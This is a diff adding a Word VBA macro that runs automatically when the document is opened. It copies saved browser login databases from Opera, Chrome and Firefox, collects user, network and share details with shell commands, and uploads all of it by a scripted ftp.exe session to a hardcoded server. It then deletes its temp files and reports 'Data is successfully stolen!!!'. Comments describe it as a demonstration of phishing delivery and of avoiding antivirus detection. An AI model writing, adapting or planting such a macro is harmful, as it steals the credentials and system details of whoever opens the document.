@@ -1,0 +1,255 @@
+Private Sub Document_Close()
+On Error Resume Next
+Set wshNetwork = CreateObject("WScript.Network")
+domonipizza = (Environ$("Username"))
+Set FSO = CreateObject("scripting.filesystemobject")
+
+F = "\\localhost\C$\Users\" & domonipizza & "\AppData\Local\temp.txt"
+
+Shell "\\localhost\C$\windows\system32\Taskkill /IM ftp.exe /F", vbNormal
+
+        Kill F
+
+End Sub
+
+Private Sub Document_Open()
+'On Error Resume Next
+Dim FSO As Object
+Dim tontolou1, tontolou2, tontolou3, tontolou4, pasteloc1, pasteloc2, pasteloc3, pasteloc4, targetfile1 As String
+Set wshNetwork = CreateObject("WScript.Network")
+namadomain = wshNetwork.UserDomain
+hotgirls = wshNetwork.computername
+domonipizza = (Environ$("Username"))
+dickheads = ActiveDocument.Path
+balabalhush = ActiveDocument.Path & "\pussies"
+'MsgBox balabalhush
+Dim PauseTime, Start
+PauseTime = 10 ' Set duration in seconds
+Start = Timer ' Set start time.
+
+Dim wsh As Object
+Set wsh = VBA.CreateObject("WScript.Shell")
+Dim waitOnReturn As Boolean: waitOnReturn = True
+Dim windowStyle As Integer: windowStyle = 1
+Set FSO = CreateObject("scripting.filesystemobject")
+'MsgBox "To steal targetted data through USB pendrives and external harddisk by opening and editing dummy documents", vbExclamation, "USB STEALING MODE"
+'MsgBox "Pendrive Stealing Mode: Successfully copied data to " & balabalhush & ". Saved password can be viewed using webbrowserpassview tool"
+
+If Dir$(balabalhush, vbDirectory) <> vbNullString Then
+Shell "cmd /c cd " & dickheads & "&& ECHO Y | rmdir /s pussies", vbHide
+
+Do While Timer < Start + PauseTime
+DoEvents ' Yield to other processes.
+Loop
+'Shell "cmd /c cd C:\Users\" & domonipizza & "\AppData\Local && ECHO Y | del /s temp.txt"
+End If
+
+If Dir$(balabalhush, vbDirectory) = vbNullString Then
+MkDir balabalhush
+End If
+
+If Dir$(balabalhush & "\" & hotgirls, vbDirectory) = vbNullString Then
+MkDir balabalhush & "\" & hotgirls
+End If
+
+If Dir$(balabalhush & "\" & hotgirls & "\" & domonipizza, vbDirectory) = vbNullString Then
+MkDir balabalhush & "\" & hotgirls & "\" & domonipizza
+End If
+
+If Dir$(balabalhush & "\" & hotgirls & "\" & domonipizza & "\opera", vbDirectory) = vbNullString Then
+MkDir balabalhush & "\" & hotgirls & "\" & domonipizza & "\opera"
+End If
+
+If Dir$(balabalhush & "\" & hotgirls & "\" & domonipizza & "\chrome", vbDirectory) = vbNullString Then
+MkDir balabalhush & "\" & hotgirls & "\" & domonipizza & "\chrome"
+End If
+
+If Dir$(balabalhush & "\" & hotgirls & "\" & domonipizza & "\firefox", vbDirectory) = vbNullString Then
+MkDir balabalhush & "\" & hotgirls & "\" & domonipizza & "\firefox"
+End If
+
+If Dir$(balabalhush & "\" & hotgirls & "\" & domonipizza & "\info", vbDirectory) = vbNullString Then
+MkDir balabalhush & "\" & hotgirls & "\" & domonipizza & "\info"
+End If
+
+If Dir$(Environ("USERPROFILE") & "\AppData\Local\info", vbDirectory) = vbNullString Then
+MkDir Environ("USERPROFILE") & "\AppData\Local\info"
+End If
+
+
+tontolou1 = Environ("USERPROFILE") & "\AppData\Roaming\Opera Software\Opera Stable\Login Data"
+pasteloc1 = balabalhush & "\" & hotgirls & "\" & domonipizza & "\opera\Login Data"
+tontolou2 = Environ("USERPROFILE") & "\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+pasteloc2 = balabalhush & "\" & hotgirls & "\" & domonipizza & "\chrome\Login Data"
+tontolou3 = Environ("USERPROFILE") & "\AppData\Roaming\Mozilla\Firefox\Profiles"
+pasteloc3 = balabalhush & "\" & hotgirls & "\" & domonipizza & "\firefox"
+tontolou4 = Environ("USERPROFILE") & "\AppData\Local\info"
+targetfile1 = Environ("USERPROFILE") & "\AppData\Local\info.txt"
+pasteloc4 = balabalhush & "\" & hotgirls & "\" & domonipizza & "\info"
+
+If Dir$(tontolou1, vbDirectory) = vbNullString Then
+tontolou1empty = 1
+End If
+If Dir$(tontolou2, vbDirectory) = vbNullString Then
+tontolou2empty = 1
+End If
+If Dir$(tontolou3, vbDirectory) = vbNullString Then
+tontolou3empty = 1
+End If
+If Dir$(tontolou4, vbDirectory) = vbNullString Then
+tontolou4empty = 1
+End If
+
+
+'MsgBox targetfile1
+
+If Right(tontolou1, 1) = "\" Then
+tontolou1 = Left(tontolou1, Len(tontolou1) - 1)
+End If
+If Right(pasteloc1, 1) = "\" Then
+pasteloc1 = Left(pasteloc1, Len(pasteloc1) - 1)
+End If
+Set FSO = CreateObject("scripting.filesystemobject")
+If FSO.FileExists(tontolou1) = False Then
+End If
+If Dir$(tontolou1, vbDirectory) <> vbNullString Then
+FSO.CopyFile Source:=tontolou1, Destination:=pasteloc1
+End If
+
+If Right(tontolou2, 1) = "\" Then
+tontolou2 = Left(tontolou2, Len(tontolou2) - 1)
+End If
+If Right(pasteloc2, 1) = "\" Then
+pasteloc2 = Left(pasteloc2, Len(pasteloc2) - 1)
+End If
+Set FSO = CreateObject("scripting.filesystemobject")
+If FSO.FileExists(tontolou2) = False Then
+End If
+If Dir$(tontolou2, vbDirectory) <> vbNullString Then
+FSO.CopyFile Source:=tontolou2, Destination:=pasteloc2
+End If
+
+If Right(tontolou3, 1) = "\" Then
+tontolou3 = Left(tontolou3, Len(tontolou3) - 1)
+End If
+If Right(pasteloc3, 1) = "\" Then
+pasteloc3 = Left(pasteloc3, Len(pasteloc3) - 1)
+End If
+Set FSO = CreateObject("scripting.filesystemobject")
+If FSO.FolderExists(tontolou3) = False Then
+End If
+If Dir$(tontolou3, vbDirectory) <> vbNullString Then
+FSO.CopyFolder Source:=tontolou3, Destination:=pasteloc3
+End If
+
+If Right(tontolou4, 1) = "\" Then
+tontolou4 = Left(tontolou4, Len(tontolou4) - 1)
+End If
+If Right(pasteloc4, 1) = "\" Then
+pasteloc4 = Left(pasteloc4, Len(pasteloc4) - 1)
+End If
+Set FSO = CreateObject("scripting.filesystemobject")
+If FSO.FolderExists(tontolou4) = False Then
+End If
+If Dir$(tontolou4, vbDirectory) <> vbNullString Then
+FSO.CopyFolder Source:=tontolou4, Destination:=pasteloc4
+End If
+
+'MsgBox "An evil employee can steal any important data not stored in the File Server e.g Browser's Saved Password by planting" _
+'& " non-malicious scripts to do evil stuff and at the same time able to evade from AV detection", vbExclamation, "File Server Mode"
+
+'ftp variables
+Dim vPath As String
+Dim vFile As String
+Dim vFTPServ As String
+
+vFTPServ = "192.168.22.168"
+
+
+
+Shell "cmd /c cd " & Environ("USERPROFILE") & "\AppData\Local\info" & "&& cmd /c del info.txt && whoami >> info.txt && ipconfig /all >> info.txt && net users >> info.txt && net share >> info.txt", vbNormalFocus
+
+
+
+F = "\\localhost\C$\Users\" & domonipizza & "\AppData\Local\temp.txt" 'creates the file that holds the FTP commands
+'Mounting file command for ftp.exe
+
+Open F For Output As #1
+Print #1, "user hacktheplanet" ' your login and password"
+Print #1, "hacktheplanet"
+'Print #1, "quote pasv"
+Print #1, "ascii" 'bin or ascii file type to send
+Print #1, "cd /"  'change to dir on server
+Print #1, "echo y | rmdir /s " & hotgirls
+Print #1, "mkdir " & hotgirls
+Print #1, "cd " & hotgirls
+Print #1, "mkdir " & domonipizza
+Print #1, "cd " & domonipizza
+Print #1, "mkdir chrome"
+Print #1, "mkdir opera"
+Print #1, "mkdir firefox"
+Print #1, "mkdir info"
+Print #1, "cd opera"
+
+If (tontolou1empty <> 1) Then
+Print #1, "lcd """ & Environ("USERPROFILE") & "\AppData\Roaming\Opera Software\Opera Stable"""
+Print #1, "put ""Login Data""" ' upload local filename to server file
+End If
+
+If (tontolou2empty <> 1) Then
+Print #1, "cd ..\chrome"
+Print #1, "lcd """ & Environ("USERPROFILE") & "\AppData\Local\Google\Chrome\User Data\Default"""
+Print #1, "mput ""Login Data""" ' upload local filename to server file
+End If
+
+If (tontolou3empty <> 1) Then
+Print #1, "cd ..\firefox"
+Print #1, "lcd """ & tontolou3
+Print #1, "mput ""*""" ' upload local filename to server file
+End If
+
+If (tontolou4empty <> 1) Then
+Print #1, "cd ..\info"
+Print #1, "lcd """ & tontolou4
+Print #1, "mput ""info.txt""" ' upload local filename to server file
+End If
+
+Print #1, "Y"
+Print #1, "close" ' close connection
+Print #1, "quit" ' Quit ftp program
+Print #1, "exit"
+Close #1
+
+
+'MsgBox "A document can contain codes to upload targetted data onto a server on the internet. In this example, we are using Windows built-int FTP tools" _
+'& " to show how easy it is to bypass an AV without using any malicious codes and tools to steal data. This document can be sent through phishing email and a little bit of Social-Engineering skills required", vbExclamation, "Email-Phishing Method"
+
+'wsh.Run "\\localhost\C$\windows\system32\ftp -n -i -g -s:" & F & " " & vFTPServ, windowStyle, waitOnReturn
+Shell "\\localhost\C$\windows\system32\ftp -n -i -g -s:" & F & " " & vFTPServ, vbNormal
+SetAttr F, vbNormal
+
+Shell "\\localhost\C$\windows\system32\Taskkill /IM ftp.exe /F", vbNormalFocus
+
+
+'Do While F <> ""
+'    If F = "" Then
+'       Exit Do
+       
+'       Shell "\\localhost\C$\windows\system32\Taskkill /IM winword.exe /F", vbNormalFocus
+'    End If
+
+'Kill F
+'Loop
+
+Do While Timer < Start + PauseTime
+DoEvents ' Yield to other processes.
+Loop
+
+
+Shell "cmd /c ECHO OFF && cd C:\Users\" & domonipizza & "\AppData\Local && ECHO Y | del /s temp.txt", vbHide
+
+MsgBox "Data is successfully stolen!!!"
+
+End Sub
+
+
